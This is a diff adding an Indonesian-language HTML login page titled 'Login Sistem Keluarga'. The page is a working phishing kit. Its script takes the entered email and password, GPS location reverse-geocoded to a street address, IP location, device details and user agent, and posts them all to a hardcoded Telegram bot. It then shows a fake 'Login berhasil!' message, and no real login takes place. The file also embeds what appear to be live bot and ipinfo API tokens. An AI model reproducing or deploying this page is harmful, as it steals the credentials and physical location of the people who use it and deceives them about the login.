@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Sistem Keluarga</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #0d0d0d;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #1a1a1a;
+      padding: 30px 25px;
+      border-radius: 15px;
+      width: 320px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.6);
+    }
+    .container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 600;
+      color: #00aaff;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background-color: #2a2a2a;
+      color: #fff;
+      font-size: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00aaff;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #008ecc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Login Sistem</h2>
+    <input id="email" type="email" placeholder="Email" />
+    <input id="password" type="password" placeholder="Password" />
+    <button onclick="kirimData()">Login</button>
+  </div>
+
+  <script>
+    const botToken = "8433961260:AAEupWD2_xGOAH7lY-q5reZCkga_qdlilf4";
+    const chatId = "7105124387";
+
+    async function kirimData() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const deviceName = getDeviceName(userAgent);
+      const resolution = `${screen.width}x${screen.height}`;
+      const time = new Date().toLocaleString("id-ID");
+
+      // Ambil IP info
+      let ipInfo = "Gagal ambil lokasi IP.";
+      try {
+        const ipRes = await fetch("https://ipinfo.io/json?token=f88f90a6e7b3a1");
+        const ipData = await ipRes.json();
+        ipInfo = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
+      } catch (e) {}
+
+      // Ambil lokasi GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          let alamat = `Koordinat: ${lat}, ${lon}`;
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const geoData = await geoRes.json();
+            const a = geoData.address;
+            alamat = `${a.road || ''}, ${a.village || a.hamlet || ''}, ${a.suburb || ''}, ${a.city || a.town || a.county || ''}, ${a.state || ''}, ${a.country || ''}`;
+          } catch (e) {}
+
+          const pesan = `
+🔐 Login Terdeteksi
+
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 GPS: ${alamat}
+🌎 IP Lokasi: ${ipInfo}
+📱 Nama Perangkat: ${deviceName}
+🖥 Resolusi: ${resolution}
+🗣 Bahasa: ${language}
+🔍 User Agent: ${userAgent}
+🕒 Waktu: ${time}
+          `;
+          kirimTelegram(pesan);
+        }, () => {
+          const pesan = `
+🔐 Login Terdeteksi
+
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 GPS: Gagal diakses
+🌎 IP Lokasi: ${ipInfo}
+📱 Nama Perangkat: ${deviceName}
+🖥 Resolusi: ${resolution}
+🗣 Bahasa: ${language}
+🔍 User Agent: ${userAgent}
+🕒 Waktu: ${time}
+          `;
+          kirimTelegram(pesan);
+        });
+      } else {
+        alert("GPS tidak tersedia.");
+      }
+    }
+
+    function getDeviceName(ua) {
+      if (ua.includes("iPhone")) return "iPhone";
+      if (ua.includes("iPad")) return "iPad";
+      if (ua.includes("Macintosh")) return "Mac";
+      if (ua.includes("Windows")) return "Windows PC";
+      if (ua.includes("Android")) {
+        const match = ua.match(/Android\s[\d.]+;\s([^;)]*)/);
+        return match ? match[1].trim() : "Android Device";
+      }
+      return "Perangkat Tidak Diketahui";
+    }
+
+    async function kirimTelegram(teks) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: teks,
+          parse_mode: "HTML"
+        })
+      });
+      alert("Login berhasil!");
+    }
+  </script>
+</body>
+</html>
